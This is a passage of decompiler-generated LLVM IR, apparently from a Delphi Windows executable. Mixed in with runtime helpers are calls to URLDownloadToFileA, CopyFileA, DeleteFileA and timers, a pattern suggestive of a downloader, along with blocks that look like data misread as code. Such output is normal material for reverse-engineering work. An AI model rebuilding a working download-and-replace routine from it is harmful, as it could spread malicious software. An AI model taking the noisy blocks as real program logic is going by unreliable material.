  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1106
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1106
  store i8 %6, i8* %7, align 1, !insn.addr !1106
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1107
  %10 = udiv i32 %4, 256, !insn.addr !1107
  %11 = trunc i32 %10 to i8, !insn.addr !1107
  %12 = add i8 %9, %11, !insn.addr !1107
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1107
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1107
  store i8 %12, i8* %14, align 1, !insn.addr !1107
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1108
  %17 = add i32 %4, 6, !insn.addr !1108
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1108
  %19 = zext i1 %16 to i32, !insn.addr !1108
  %20 = and i32 %4, -65536, !insn.addr !1108
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1109
  %23 = or i1 %16, %22, !insn.addr !1109
  %24 = add i32 %18, 6, !insn.addr !1109
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1109
  %26 = zext i1 %23 to i32, !insn.addr !1109
  %27 = and i32 %25, 15, !insn.addr !1109
  %28 = or i32 %27, %20, !insn.addr !1109
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1109
  %31 = or i32 %28, %30, !insn.addr !1109
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1110
  %33 = load i8, i8* %32, align 1, !insn.addr !1110
  %34 = trunc i32 %27 to i8, !insn.addr !1110
  %35 = xor i8 %33, %34, !insn.addr !1110
  store i8 %35, i8* %32, align 1, !insn.addr !1110
  %36 = add i32 %0, 1311123697, !insn.addr !1111
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1111
  %38 = load i8, i8* %37, align 1, !insn.addr !1111
  %39 = udiv i32 %3, 256, !insn.addr !1111
  %40 = trunc i32 %39 to i8, !insn.addr !1111
  %41 = add i8 %38, %40, !insn.addr !1111
  store i8 %41, i8* %37, align 1, !insn.addr !1111
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1112
  %43 = load i32, i32* %42, align 4, !insn.addr !1112
  %44 = sub i32 %43, %31, !insn.addr !1112
  store i32 %44, i32* %42, align 4, !insn.addr !1112
  %45 = add i32 %3, 117, !insn.addr !1113
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1113
  %47 = load i8, i8* %46, align 1, !insn.addr !1113
  %48 = add i8 %47, %34, !insn.addr !1113
  %49 = icmp eq i8 %48, 0, !insn.addr !1113
  store i8 %48, i8* %46, align 1, !insn.addr !1113
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1114

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1115
  %51 = trunc i32 %3 to i16, !insn.addr !1116
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1116
  %53 = load i32, i32* %52, align 4, !insn.addr !1116
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1116
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1117
  %55 = load i8, i8* %54, align 1, !insn.addr !1117
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1117
  %56 = load i8, i8* %32, align 1, !insn.addr !1118
  %57 = add i8 %56, %34, !insn.addr !1118
  store i8 %57, i8* %32, align 1, !insn.addr !1118
  %58 = call i32 @__asm_iretd(), !insn.addr !1119
  %59 = add i32 %2, -117, !insn.addr !1120
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1120
  %61 = load i8, i8* %60, align 1, !insn.addr !1120
  %62 = add i8 %61, -69, !insn.addr !1120
  store i8 %62, i8* %60, align 1, !insn.addr !1120
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1121
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1122
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1122
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1122
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1123
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1124
  %67 = add i32 %66, 1, !insn.addr !1124
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1124
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1125
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1126
  ret i32 0, !insn.addr !1127

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1128
  store i32 %69, i32* %ebx, align 4, !insn.addr !1129
  %70 = icmp slt i32 %69, 0, !insn.addr !1130
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1131

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1132
  store i32 %71, i32* %ebx, align 4, !insn.addr !1132
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1133
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1134
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1135
  %75 = call i32 @function_403c90(), !insn.addr !1136
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1137
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1138
  br label %dec_label_pc_405d79, !insn.addr !1138

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1139
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1140
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1140
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1140
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1141
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1142
  %3 = add i32 %2, 1, !insn.addr !1142
  %4 = icmp eq i32 %3, 0, !insn.addr !1142
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1142
  %5 = icmp eq i1 %4, false, !insn.addr !1143
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1143

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1144
  br label %dec_label_pc_405da9, !insn.addr !1144

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1145
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1146
  ret i32 0, !insn.addr !1147
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1148
  ret i32 %0, !insn.addr !1148
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1149
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1150
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1151
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1151
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1151
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1152
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1153
  %3 = add i32 %2, -1, !insn.addr !1153
  %4 = icmp eq i32 %2, 0, !insn.addr !1153
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1153
  %5 = icmp eq i1 %4, false, !insn.addr !1154
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1154

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1155
  br label %dec_label_pc_405df4, !insn.addr !1156

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1157
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1158
  ret i32 0, !insn.addr !1159
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1160
  ret i32 %0, !insn.addr !1160
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1161
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1162
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1163
}

define i32 @function_405e0f(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0f:
  %esp.0.reg2mem = alloca i32, !insn.addr !1164
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call x86_fp80 @__decompiler_undefined_function_9()
  %6 = call i1 @__decompiler_undefined_function_1()
  %7 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_out(i32 177, i32 %4), !insn.addr !1164
  %8 = and i32 %0, 255, !insn.addr !1165
  %9 = add i32 %2, %8, !insn.addr !1165
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1165
  %11 = load i8, i8* %10, align 1, !insn.addr !1165
  %12 = and i32 %0, -256, !insn.addr !1165
  %13 = fptosi x86_fp80 %5 to i64, !insn.addr !1166
  %14 = add i32 %3, 785765858, !insn.addr !1166
  %15 = inttoptr i32 %14 to i64*, !insn.addr !1166
  store i64 %13, i64* %15, align 4, !insn.addr !1166
  br i1 %6, label %dec_label_pc_405e84, label %dec_label_pc_405e1b, !insn.addr !1167

dec_label_pc_405e1b:                              ; preds = %dec_label_pc_405e0f
  %16 = zext i8 %11 to i32, !insn.addr !1165
  %17 = or i32 %12, %16, !insn.addr !1165
  %18 = inttoptr i32 %17 to i8*, !insn.addr !1168
  %19 = load i8, i8* %18, align 1, !insn.addr !1168
  %factor = mul i8 %11, 26
  %20 = add i8 %19, %factor, !insn.addr !1169
  store i8 %20, i8* %18, align 1, !insn.addr !1169
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1170
  %21 = call i32 @__readfsdword(i32 0), !insn.addr !1171
  store i32 %21, i32* %stack_var_-48, align 4, !insn.addr !1171
  %22 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1171
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !1172
  %23 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1173
  ret i32 %23, !insn.addr !1174

dec_label_pc_405e84:                              ; preds = %dec_label_pc_405e0f
  %24 = select i1 %7, i32 -4, i32 4, !insn.addr !1175
  %25 = add i32 %24, %0, !insn.addr !1175
  %26 = inttoptr i32 %25 to i8*, !insn.addr !1176
  %27 = load i8, i8* %26, align 1, !insn.addr !1176
  %28 = zext i8 %27 to i32, !insn.addr !1176
  %29 = or i32 %12, %28, !insn.addr !1176
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1177
  %31 = load i8, i8* %30, align 1, !insn.addr !1177
  %32 = add i8 %31, %27, !insn.addr !1177
  store i8 %32, i8* %30, align 1, !insn.addr !1177
  %33 = add i32 %1, -963905451, !insn.addr !1178
  %34 = inttoptr i32 %33 to i8*, !insn.addr !1178
  %35 = load i8, i8* %34, align 1, !insn.addr !1178
  %36 = trunc i32 %3 to i8, !insn.addr !1178
  %37 = add i8 %35, %36, !insn.addr !1178
  store i8 %37, i8* %34, align 1, !insn.addr !1178
  %38 = call i32 @function_406f9c(), !insn.addr !1179
  %39 = call i32 @"@LStrPos"(), !insn.addr !1180
  %40 = call i32 @"@LStrPos"(), !insn.addr !1181
  %41 = add i32 %40, -1, !insn.addr !1182
  %42 = icmp slt i32 %41, 0, !insn.addr !1183
  %43 = add i32 %39, 2, !insn.addr !1184
  %44 = icmp sgt i32 %43, %41, !insn.addr !1185
  %or.cond = or i1 %42, %44
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1186

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e84
  %45 = add i32 %1, -12, !insn.addr !1187
  store i32 %45, i32* %stack_var_-4, align 4, !insn.addr !1188
  %46 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1188
  %47 = call i32 @"@LStrCopy"(), !insn.addr !1189
  %48 = inttoptr i32 %45 to i32*, !insn.addr !1190
  %49 = load i32, i32* %48, align 4, !insn.addr !1190
  %50 = icmp eq i32 %49, 0, !insn.addr !1190
  store i32 %46, i32* %esp.0.reg2mem, !insn.addr !1191
  br i1 %50, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1191

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %51 = call i32 @function_406d84(), !insn.addr !1192
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1193
  %53 = call i32 @"@LStrCat"(), !insn.addr !1194
  %54 = call i32 @function_4036c8(), !insn.addr !1195
  %55 = inttoptr i32 %54 to i8*, !insn.addr !1196
  %56 = call i1 @DeleteFileA(i8* %55), !insn.addr !1197
  %57 = call i32 @function_4036c8(), !insn.addr !1198
  %58 = inttoptr i32 %57 to i8*, !insn.addr !1199
  store i8* %58, i8** %stack_var_-20, align 4, !insn.addr !1199
  %59 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1199
  %60 = call i1 @CopyFileA(i8* %58, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1200
  %61 = call i32 @function_405b70(), !insn.addr !1201
  store i32 %59, i32* %esp.0.reg2mem, !insn.addr !1201
  br label %dec_label_pc_405f34, !insn.addr !1201

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e84
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %62 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1202
  %63 = load i32, i32* %62, align 4, !insn.addr !1202
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !1203
  %64 = add i32 %esp.0.reload, 8, !insn.addr !1204
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1204
  store i32 4218710, i32* %65, align 4, !insn.addr !1204
  %66 = call i32 @"@LStrArrayClr"(), !insn.addr !1205
  ret i32 %66, !insn.addr !1206
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1207
  ret i32 %0, !insn.addr !1207
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1208
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1209
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1209
  %3 = load i32, i32* %2, align 4, !insn.addr !1209
  ret i32 %3, !insn.addr !1210
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1211
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1211
  store i32 %1, i32* %2, align 4, !insn.addr !1211
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1212
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1212
  %7 = add i8 %4, %6, !insn.addr !1212
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1212
  store i8 %7, i8* %8, align 1, !insn.addr !1212
  %9 = load i32, i32* %eax, align 4, !insn.addr !1213
  ret i32 %9, !insn.addr !1213
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1214
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1214
  store i8 %4, i8* %5, align 1, !insn.addr !1214
  %6 = mul i32 %0, 4096, !insn.addr !1215
  %7 = udiv i32 %0, 1048576, !insn.addr !1215
  %8 = or i32 %7, %6, !insn.addr !1215
  %9 = and i32 %0, 1048576, !insn.addr !1215
  %10 = icmp eq i32 %9, 0, !insn.addr !1215
  %11 = load i32, i32* %edx, align 4, !insn.addr !1216
  %12 = trunc i32 %11 to i16, !insn.addr !1216
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1216
  %14 = sext i8 %13 to i32, !insn.addr !1216
  %15 = or i32 %2, %14, !insn.addr !1216
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1217
  %17 = and i32 %15, -256, !insn.addr !1217
  %18 = or i32 %17, %16, !insn.addr !1217
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1218
  %20 = load i8, i8* %19, align 1, !insn.addr !1218
  %21 = mul i8 %20, 2, !insn.addr !1218
  %22 = lshr i8 %20, 7, !insn.addr !1218
  %23 = or i8 %22, %21, !insn.addr !1218
  store i8 %23, i8* %19, align 1, !insn.addr !1218
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1219
  %26 = udiv i32 %1, 256, !insn.addr !1219
  %27 = trunc i32 %26 to i8, !insn.addr !1219
  %28 = add i8 %25, %27, !insn.addr !1219
  %29 = load i32, i32* %edx, align 4, !insn.addr !1219
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1219
  store i8 %28, i8* %30, align 1, !insn.addr !1219
  %31 = add i32 %8, -4, !insn.addr !1220
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1220
  store i32 4218448, i32* %32, align 4, !insn.addr !1220
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1221
  %34 = sext i1 %33 to i32, !insn.addr !1221
  ret i32 %34, !insn.addr !1222
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1223
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1223
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1223
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1224
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1225
  %3 = add i32 %2, 1, !insn.addr !1225
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1225
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1226
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1227
  ret i32 0, !insn.addr !1228
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1229
  ret i32 %0, !insn.addr !1229
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1230
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1231
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1232
  %2 = add i32 %1, -1, !insn.addr !1232
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1232
  ret i32 %0, !insn.addr !1233
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1234
  %0 = call i32 @function_40603c(), !insn.addr !1235
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1236
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1237
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1237

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1238
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1239
  %5 = load i32, i32* %4, align 4, !insn.addr !1239
  %6 = icmp eq i32 %5, 0, !insn.addr !1239
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1240
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1240

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1241
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1242
  unreachable, !insn.addr !1242

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1243
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1244
  %1 = icmp eq i32 %0, 0, !insn.addr !1244
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1245

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1246
  br label %dec_label_pc_40601a, !insn.addr !1246

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1247
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1248
  %5 = load i32, i32* %4, align 4, !insn.addr !1248
  %6 = mul i32 %5, 1000, !insn.addr !1248
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1249
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1250
  ret i32 %7, !insn.addr !1251
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1252
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1252
  %1 = icmp eq i32 %0, 0, !insn.addr !1252
  store i32 %0, i32* %.reg2mem, !insn.addr !1253
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1253

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1253
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1253
  br label %dec_label_pc_406045, !insn.addr !1253

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1254
  ret i32 %.reload, !insn.addr !1255
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1256
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1257
  ret i32 %1, !insn.addr !1258
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1259
  %1 = icmp eq i32 %0, 0, !insn.addr !1259
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1260

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1261
  br label %dec_label_pc_406076, !insn.addr !1261

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1262
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1263
  ret i32 %3, !insn.addr !1264
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1265
  ret i32 %0, !insn.addr !1266
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1267
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1267
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1267
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1268
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1269
  %3 = add i32 %2, 1, !insn.addr !1269
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1269
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1270
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1271
  ret i32 0, !insn.addr !1272
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1273
  ret i32 %0, !insn.addr !1273
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1274
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1275
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1276
  %2 = add i32 %1, -1, !insn.addr !1276
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1276
  ret i32 %0, !insn.addr !1277
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1278
  ret i32 %0, !insn.addr !1278
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1279
  %ebx.0.reg2mem = alloca i32, !insn.addr !1279
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1280
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1281
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1281
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1281
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1282
  %4 = call i32 @function_4034c8(), !insn.addr !1283
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1284
  %6 = call i32 @function_4034c8(), !insn.addr !1285
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1286
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1286
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1286

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1287
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1287
  %11 = load i8, i8* %10, align 1, !insn.addr !1287
  %12 = icmp eq i8 %11, 61, !insn.addr !1287
  %13 = icmp eq i1 %12, false, !insn.addr !1288
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1288

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1289
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1289
  store i8 46, i8* %16, align 1, !insn.addr !1289
  br label %dec_label_pc_406162, !insn.addr !1290

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1291
